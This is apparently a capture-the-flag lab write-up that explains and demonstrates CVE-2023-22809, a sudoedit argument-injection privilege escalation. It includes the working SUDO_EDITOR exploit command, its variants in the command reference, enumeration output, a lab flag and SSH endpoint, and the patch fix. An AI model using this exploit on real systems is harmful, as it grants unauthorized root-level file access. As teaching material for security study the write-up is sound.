# L04 · Act I · Privilege Escalation — The Editor Boundary

**MITRE tag:** T1068 — Exploitation for Privilege Escalation  
**CVE:** CVE-2023-22809 — sudoedit argument injection  
**Challenge type:** sudo policy bypass via editor environment variable injection  
**Flag:** `bl_396bfc8b9ee999b358298e74e809294e`  
**SSH:** `pe-sudoedit@204.168.229.209 -p 2224`

---

## Challenge brief

> *"A narrow sudoedit grant looks safe because it names exactly one harmless file. The editor boundary is stale, and a package parser bug turns that boundary into root-only file access."*

A sudoers rule allows editing one specific file as root. The installed sudo version is vulnerable to CVE-2023-22809, which lets an attacker inject additional files into the editor's argument list — bypassing the file restriction entirely. Use this to read the root-only key, write it to `/tmp/.pe-sudoedit-proof`, and run `verify`.

---

## Building the concepts

Before getting to the exploit, you need to understand four things:

1. What sudoedit is and why it is considered safer than plain `sudo vim`
2. How sudoedit decides which editor to launch
3. What CVE-2023-22809 actually breaks
4. Why the vulnerable version matters

---

### Concept 1 — What sudoedit is

When you run `sudo vim /etc/motd`, sudo gives you a vim session running as root. vim can run shell commands (`:!sh`), meaning that `sudo vim` is effectively `sudo sh` — a root shell, just with extra steps. Any admin who grants `sudo vim` is unknowingly granting a root shell.

`sudoedit` was designed to fix this. Instead of running the editor as root, it does the following:

```
[lowpriv user]
    |
    |--> sudoedit /etc/motd
    |
    v
[sudo, running as root]
    |
    |--> 1. Create a temp copy of /etc/motd at /tmp/sudoedit.XXXX/motd
    |        - temp file is owned by lowpriv (so the user can edit it)
    |        - temp file contains the same content as the original
    |
    |--> 2. Open the editor on the TEMP COPY
    |        - the editor runs as the lowpriv user, NOT as root
    |        - no root shell is possible from inside the editor
    |
    |--> 3. After the editor exits:
             - if the temp file was modified, copy it back to /etc/motd AS ROOT
             - if not modified, do nothing
```

The key safety property: **the editor never runs as root**. You are editing a temp copy owned by you. The only root action is the final copy-back. So no shell escape from the editor can give you root.

This is why `sudoedit /specific/file` was considered a safe way to let a user edit one file as root without giving them anything else.

---

### Concept 2 — How sudoedit chooses the editor

sudoedit does not have a built-in editor. It needs to know which editor to launch. It checks these in order:

| Source | Variable | Example |
|---|---|---|
| 1st priority | `SUDO_EDITOR` | `export SUDO_EDITOR=vim` |
| 2nd priority | `VISUAL` | `export VISUAL=nano` |
| 3rd priority | `EDITOR` | `export EDITOR=vi` |
| Fallback | configured in sudoers | `Defaults editor=/usr/bin/vi` |

Normally, sudo strips environment variables before running anything (this is what `env_reset` does in the sudoers Defaults). But `SUDO_EDITOR` is intentionally allowed through — it is the designed way for a user to pick their editor for sudoedit sessions.

So you can legitimately set:

```bash
export SUDO_EDITOR=nano
sudoedit /etc/motd
```

...and nano opens instead of vi. This is expected and allowed.

---

### Concept 3 — CVE-2023-22809: what breaks

The bug is in how sudo parses the value of `SUDO_EDITOR` (and `VISUAL` / `EDITOR`).

When sudo reads `SUDO_EDITOR`, it splits the value into tokens to extract:
- The editor binary (e.g., `vi`)
- Any flags/arguments to pass to that editor (e.g., `--noplugin`)

The bug: **if the value contains `--`, everything after it is treated as additional file paths to include in the edit session** — and those extra files go through the same root-privilege temp-copy process, but are **never checked against the sudoers policy**.

Here is the difference between normal and exploited:

**Normal sudoedit flow:**
```
SUDO_EDITOR="vi"
sudoedit /etc/motd

→ sudo checks: is /etc/motd allowed? YES (it is in the rule)
→ sudo creates temp copy of /etc/motd
→ launches: vi /tmp/tempdir/motd
```

**Exploited sudoedit flow (CVE-2023-22809):**
```
SUDO_EDITOR="vi -- /root/.pe-sudoedit-key"
sudoedit /etc/motd

→ sudo checks: is /etc/motd allowed? YES (it is in the rule)
→ sudo sees "-- /root/.pe-sudoedit-key" in SUDO_EDITOR
→ [BUG] adds /root/.pe-sudoedit-key to the file list WITHOUT checking policy
→ sudo creates temp copies of BOTH files (as root — so it can read /root/.pe-sudoedit-key)
→ temp copies are owned by the invoking user (so you can read them)
→ launches: vi -- /tmp/tempdir/pe-sudoedit-key /tmp/tempdir/motd
```

The "editor boundary" from the challenge description is the policy check that is supposed to limit which files get opened. CVE-2023-22809 crosses that boundary via the editor variable.

---

### Concept 4 — Why the version matters

CVE-2023-22809 was patched in sudo **1.9.12p2**. The fix: after building the file list (including any extras from `SUDO_EDITOR`), sudo now validates every file in the list against the sudoers policy — not just the ones you passed on the command line.

Any sudo version from **1.8.0 to 1.9.12p1** is vulnerable.

The box is running **1.9.5p2**, which is well within that range.

---

## The correct approach

```bash
# 1. Check your sudo rules
sudo -l
# → (root) NOPASSWD: sudoedit /etc/motd

# 2. Confirm the version is vulnerable
sudo --version | head -1
# → Sudo version 1.9.5p2 — vulnerable (range: 1.8.0–1.9.12p1)

# 3. Inject the key file via SUDO_EDITOR
SUDO_EDITOR="vi -- /root/.pe-sudoedit-key" sudoedit /etc/motd
# → vi opens with /root/.pe-sudoedit-key content visible
# → read the 32-char hex key, then :qa! to quit all buffers

# 4. Write proof and verify
echo "<key>" > /tmp/.pe-sudoedit-proof
verify
```

---

## Enumeration log

### Step 1 — Identify our user

```bash
id
```

**Result:** `uid=1000(operator) gid=100(users) groups=100(users)` — no interesting groups, no sudo on anything by default.

---

### Step 2 — Check sudo rules

```bash
sudo -l
```

**Result:**
```
Matching Defaults entries for operator on e5f106aafed5:
    env_reset, mail_badpass, secure_path=/usr/local/sbin:...

User operator may run the following commands on e5f106aafed5:
    (root) NOPASSWD: sudoedit /etc/motd
```

**Conclusion:** One sudoedit rule, one specific file — `/etc/motd`. This is the "narrow grant." The rule names exactly one harmless file and uses `sudoedit` (not `sudo vi`), so there is no direct shell escape from the editor. The surface looks minimal.

The question becomes: is the version of sudo vulnerable to something?

---

### Step 3 — Check sudo version

```bash
sudo --version | head -1
```

**Result:** `Sudo version 1.9.5p2`

**Conclusion:** 1.9.5p2 falls squarely in the CVE-2023-22809 vulnerable range (1.8.0–1.9.12p1). The editor boundary is breakable.

---

### Step 4 — Execute the exploit

```bash
SUDO_EDITOR="vi -- /root/.pe-sudoedit-key" sudoedit /etc/motd
```

**What happens:**
- sudo processes `SUDO_EDITOR`: editor = `vi`, sees `-- /root/.pe-sudoedit-key`
- The bug adds `/root/.pe-sudoedit-key` to the file list without a policy check
- sudo creates temp copies of both files as root (it can read the key even though the invoking user cannot)
- Launches: `vi -- /tmp/.../pe-sudoedit-key /tmp/.../motd`
- vi opens — key file content is visible in the first buffer

**Result:** `703fe0ce8d5983a07779968836ef3df1` (read from vi's first buffer)

Exit vi:
```
:qa!
```

---

### Step 5 — Write proof and verify

```bash
echo "703fe0ce8d5983a07779968836ef3df1" > /tmp/.pe-sudoedit-proof
verify
```

**Result:**
```
Level solved: pe-sudoedit
Your flag: bl_396bfc8b9ee999b358298e74e809294e
```

---

## What the vulnerability was

The sudoers rule `sudoedit /etc/motd` was designed to be safe: no root shell, no wildcards, one specific harmless file. The designer's mental model was correct — sudoedit does not run the editor as root, and the rule names only one file.

The flaw: the designer assumed the "files to edit" list would only ever contain the file(s) from the command line. CVE-2023-22809 breaks that assumption by letting the user inject additional files through the `SUDO_EDITOR` environment variable. sudo's policy check only covered the files on the command line; files from the editor variable bypassed the check entirely.

### Why this is particularly deceptive

The danger of this vulnerability is that it is **not visible in the sudoers rule itself**. A security reviewer looking at:

```
(root) NOPASSWD: sudoedit /etc/motd
```

would reasonably conclude this is safe — no shell-capable binary, exact file path, no wildcards. The vulnerability is in the sudo version, not the policy. You can only detect the risk by checking the sudo version and cross-referencing against the CVE list.

### The difference from L02 (sudo gawk)

| | L02 — sudo gawk | L04 — sudoedit CVE |
|---|---|---|
| The rule looks dangerous | Yes — gawk is an interpreter | No — sudoedit looks safe by design |
| The risk is in the rule | Yes | No — rule is fine, binary is buggy |
| Defense | Restrict dangerous binaries | Patch sudo |
| Detection | `sudo -l` shows an obvious risk | Only detectable by version check |

### The fix

After upgrading to sudo ≥ 1.9.12p2: the same `SUDO_EDITOR` setting would cause sudoedit to check `/root/.pe-sudoedit-key` against the policy, see it is not in the allowed list, and exit with "not allowed to edit files in … " instead of opening the editor.

The practical fix on this box: `apk upgrade sudo`.

---

## Carryover findings

None.

---

## Dead ends

None in this session — the approach was direct once the CVE was identified. The only uncertainty was the key file name, which the level naming pattern correctly predicted.

---

## Command reference

```bash
# Check your sudo rules
sudo -l

# Check sudo version (vulnerable range: 1.8.0–1.9.12p1)
sudo --version | head -1

# CVE-2023-22809: inject a file via SUDO_EDITOR
# Syntax: SUDO_EDITOR="<editor> -- <file-to-inject>" sudoedit <allowed-file>
SUDO_EDITOR="vi -- /root/.pe-sudoedit-key" sudoedit /etc/motd

# Inside vi: navigate buffers
:n          # next file (if first file is the injected one, :n shows motd)
:qa!        # quit all buffers without saving

# Write proof and verify
echo "<key>" > /tmp/.pe-sudoedit-proof
verify

# The same exploit works with VISUAL or EDITOR if SUDO_EDITOR is stripped
VISUAL="vi -- /root/target" sudoedit /etc/motd
EDITOR="vi -- /root/target" sudoedit /etc/motd
```